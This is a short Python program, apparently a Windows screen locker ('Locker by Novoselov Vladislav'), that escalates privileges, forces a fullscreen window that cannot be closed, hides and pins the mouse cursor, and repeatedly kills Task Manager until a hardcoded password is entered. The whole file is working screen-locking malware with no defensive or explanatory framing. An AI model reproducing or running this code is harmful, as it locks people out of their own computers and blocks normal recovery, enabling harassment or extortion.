from tkinter import Tk, Entry, Label
import pyautogui, sys, os, elevate, psutil

def dead():
    root = Tk()
    elevate.elevate()

    def labels():
        global entry
        label = Label(root, text='Write the password', font='Courier 30')
        label.place(relx = .5, rely = .4, anchor = 'center')

        label = Label(root, text = 'Locker by Novoselov Vladislav', font = 'Courier 14')
        label.place(relx = .5, rely = .94, anchor = 'center')


        entry = Entry(root, font = 'Courier 16')
        entry.place(relx= .5 , rely= .5, anchor='center', width=380, height=40)
        entry.focus()

    labels()

    def work():
        root.protocol('WM_DELETE_WINDOW', lambda: None)
        root.attributes('-fullscreen', True)
        root.config(cursor='none')
        pyautogui.FAILSAFE = False




    while True:
        work()
        pyautogui.moveTo(0,0)
        root.update()
        if entry.get() == '23182003':
            sys.exit()
        else:
            pass

        for proc in psutil.process_iter():
            name = proc.name()
            if name == "Taskmgr.exe":
                os.system('taskkill /im Taskmgr.exe')
            else:
                pass
              
if __name__ == '__main__':
    dead()
